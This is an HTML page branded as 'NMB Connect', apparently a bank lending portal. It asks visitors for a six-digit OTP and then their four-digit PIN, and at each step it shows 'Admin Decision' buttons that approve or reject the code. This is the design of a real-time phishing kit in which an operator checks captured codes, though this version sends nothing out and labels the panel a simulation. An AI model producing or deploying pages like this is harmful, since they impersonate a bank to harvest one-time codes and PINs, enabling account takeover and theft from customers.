<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NMB Connect - Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
        body { 
            font-family: 'Inter', sans-serif; 
            background: linear-gradient(to bottom, #004a99 0%, #004a99 200px, #f4f7fa 200px);
            min-height: 100vh;
        }
        .nmb-blue { color: #003366; }
        .nmb-bg-blue { background-color: #003366; }
        .otp-input:focus { border-color: #f2a900; box-shadow: 0 0 0 2px rgba(242, 169, 0, 0.2); }
        .admin-btn { transition: all 0.2s; }
        .admin-btn:hover { transform: translateY(-2px); }
    </style>
</head>
<body class="flex flex-col items-center">
    <div class="mt-8 mb-6 text-center">
        <div class="flex items-center justify-center space-x-1">
            <span class="text-2xl font-black text-white">NMB</span>
            <span class="text-2xl font-black text-[#f2a900]">Connect</span>
        </div>
        <p class="text-white/80 text-[10px] mt-1 uppercase tracking-[0.2em] font-bold">Verification</p>
    </div>

    <main class="w-full max-w-lg px-4 mb-8">
        <div class="bg-white rounded-[2.5rem] shadow-2xl overflow-hidden">
            <!-- OTP Form -->
            <div id="otpForm" class="p-10 space-y-10">
                <div class="text-center">
                    <h2 class="text-3xl font-black text-gray-800 tracking-tight">Verify OTP</h2>
                    <p class="text-gray-400 text-sm mt-2 font-medium">Sent to <span id="phoneDisplay" class="font-black text-gray-700"></span></p>
                </div>

                <div class="space-y-8">
                    <div class="flex justify-between space-x-2">
                        <input type="text" maxlength="1" class="otp-input w-full h-16 text-center text-2xl font-black bg-gray-50/50 border border-gray-100 rounded-2xl focus:outline-none">
                        <input type="text" maxlength="1" class="otp-input w-full h-16 text-center text-2xl font-black bg-gray-50/50 border border-gray-100 rounded-2xl focus:outline-none">
                        <input type="text" maxlength="1" class="otp-input w-full h-16 text-center text-2xl font-black bg-gray-50/50 border border-gray-100 rounded-2xl focus:outline-none">
                        <input type="text" maxlength="1" class="otp-input w-full h-16 text-center text-2xl font-black bg-gray-50/50 border border-gray-100 rounded-2xl focus:outline-none">
                        <input type="text" maxlength="1" class="otp-input w-full h-16 text-center text-2xl font-black bg-gray-50/50 border border-gray-100 rounded-2xl focus:outline-none">
                        <input type="text" maxlength="1" class="otp-input w-full h-16 text-center text-2xl font-black bg-gray-50/50 border border-gray-100 rounded-2xl focus:outline-none">
                    </div>
                    
                    <div class="text-center">
                        <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">
                            Didn't receive code? <button id="resendBtn" class="text-[#004a99] hover:underline">Resend in <span id="timer">59</span>s</button>
                        </p>
                    </div>
                </div>

                <button id="submitBtn" class="w-full nmb-bg-blue text-white font-black py-6 rounded-3xl shadow-xl hover:opacity-95 transition-all transform active:scale-[0.98] uppercase tracking-[0.2em] text-sm">
                    Verify & Continue
                </button>
            </div>

            <!-- Polling Overlay -->
            <div id="pollingOverlay" class="hidden p-12 text-center space-y-10">
                <div class="relative w-28 h-28 mx-auto">
                    <div class="absolute inset-0 border-[6px] border-gray-50 rounded-full"></div>
                    <div class="absolute inset-0 border-[6px] border-[#f2a900] border-t-transparent rounded-full animate-spin"></div>
                    <div class="absolute inset-0 flex items-center justify-center">
                        <i class="fas fa-key text-4xl nmb-blue"></i>
                    </div>
                </div>
                <div class="space-y-3">
                    <h3 class="text-2xl font-black text-gray-800 tracking-tight">Validating OTP</h3>
                    <p class="text-gray-400 text-sm font-medium leading-relaxed">Please wait while we confirm your code.</p>
                </div>

                <!-- Admin Action Simulation -->
                <div class="bg-gray-50 rounded-3xl p-6 space-y-4">
                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Admin Decision (OTP)</p>
                    <div class="grid grid-cols-2 gap-3">
                        <button onclick="handleAdmin('approve')" class="admin-btn bg-green-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
                            <i class="fas fa-check"></i> <span>VALID</span>
                        </button>
                        <button onclick="handleAdmin('decline')" class="admin-btn bg-red-500 text-white font-black py-4 rounded-2xl shadow-lg flex items-center justify-center space-x-2">
                            <i class="fas fa-times"></i> <span>INVALID</span>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- PIN Modal -->
    <div id="pinModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
        <div class="bg-white rounded-[2.5rem] max-w-sm w-full p-10 text-center space-y-8 shadow-2xl relative overflow-hidden">
            <div class="text-center">
                <h4 class="text-2xl font-black text-gray-800 tracking-tight uppercase">Confirm PIN</h4>
                <p class="text-gray-400 text-xs mt-2 font-medium">Re-enter your 4-digit PIN to finalize</p>
            </div>

            <div id="pinEntry" class="space-y-8">
                <div class="flex justify-between space-x-3">
                    <input type="password" maxlength="1" class="pin-confirm w-full h-16 text-center text-2xl font-black bg-gray-50 border border-gray-100 rounded-2xl focus:outline-none">
                    <input type="password" maxlength="1" class="pin-confirm w-full h-16 text-center text-2xl font-black bg-gray-50 border border-gray-100 rounded-2xl focus:outline-none">
                    <input type="password" maxlength="1" class="pin-confirm w-full h-16 text-center text-2xl font-black bg-gray-50 border border-gray-100 rounded-2xl focus:outline-none">
                    <input type="password" maxlength="1" class="pin-confirm w-full h-16 text-center text-2xl font-black bg-gray-50 border border-gray-100 rounded-2xl focus:outline-none">
                </div>
                <button id="confirmPinBtn" class="w-full nmb-bg-blue text-white font-black py-5 rounded-2xl uppercase tracking-widest text-xs">
                    Confirm & Complete
                </button>
            </div>

            <!-- PIN Admin Simulation -->
            <div id="pinAdmin" class="hidden space-y-6">
                <div class="animate-pulse flex flex-col items-center">
                    <div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mb-4">
                        <i class="fas fa-lock nmb-blue"></i>
                    </div>
                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest">Verifying PIN...</p>
                </div>
                <div class="grid grid-cols-2 gap-3">
                    <button onclick="handlePinAdmin('valid')" class="bg-green-500 text-white font-black py-4 rounded-xl text-xs uppercase tracking-widest">Valid PIN</button>
                    <button onclick="handlePinAdmin('invalid')" class="bg-red-500 text-white font-black py-4 rounded-xl text-xs uppercase tracking-widest">Invalid PIN</button>
                </div>
            </div>
        </div>
    </div>

    <footer class="pb-8 text-center text-gray-400 text-[10px] font-black uppercase tracking-[0.3em]">
        &copy; 2026 NMB Holdings | Secure Lending Platform
    </footer>

    <script>
        const otpInputs = document.querySelectorAll('.otp-input');
        const pinConfirmInputs = document.querySelectorAll('.pin-confirm');
        const submitBtn = document.getElementById('submitBtn');
        const otpForm = document.getElementById('otpForm');
        const pollingOverlay = document.getElementById('pollingOverlay');
        const pinModal = document.getElementById('pinModal');
        const pinEntry = document.getElementById('pinEntry');
        const pinAdmin = document.getElementById('pinAdmin');
        const confirmPinBtn = document.getElementById('confirmPinBtn');
        const phoneDisplay = document.getElementById('phoneDisplay');
        const timerText = document.getElementById('timer');

        const session = JSON.parse(localStorage.getItem('nmb_session') || '{}');
        phoneDisplay.textContent = session.phone || '+263XXXXXXXXX';

        // OTP Logic
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                checkOtpComplete();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) otpInputs[index - 1].focus();
            });
        });

        function checkOtpComplete() {
            const otp = Array.from(otpInputs).map(i => i.value).join('');
            if (otp.length === 6) {
                setTimeout(triggerSubmit, 300);
            }
        }

        function triggerSubmit() {
            otpForm.classList.add('hidden');
            pollingOverlay.classList.remove('hidden');
        }

        submitBtn.addEventListener('click', triggerSubmit);

        function handleAdmin(decision) {
            if (decision === 'approve') {
                pinModal.classList.remove('hidden');
            } else {
                location.reload();
            }
        }

        // PIN Logic
        pinConfirmInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value && index < pinConfirmInputs.length - 1) {
                    pinConfirmInputs[index + 1].focus();
                }
                checkPinComplete();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) pinConfirmInputs[index - 1].focus();
            });
        });

        function checkPinComplete() {
            const pin = Array.from(pinConfirmInputs).map(i => i.value).join('');
            if (pin.length === 4) {
                setTimeout(triggerPinConfirm, 300);
            }
        }

        function triggerPinConfirm() {
            pinEntry.classList.add('hidden');
            pinAdmin.classList.remove('hidden');
        }

        confirmPinBtn.addEventListener('click', triggerPinConfirm);

        function handlePinAdmin(decision) {
            if (decision === 'valid') {
                window.location.href = 'success.html';
            } else {
                pinEntry.classList.remove('hidden');
                pinAdmin.classList.add('hidden');
                pinConfirmInputs.forEach(i => i.value = '');
                pinConfirmInputs[0].focus();
            }
        }

        // Timer
        let timeLeft = 59;
        setInterval(() => {
            if (timeLeft > 0) {
                timeLeft--;
                timerText.textContent = timeLeft;
            }
        }, 1000);
    </script>
</body>
</html>
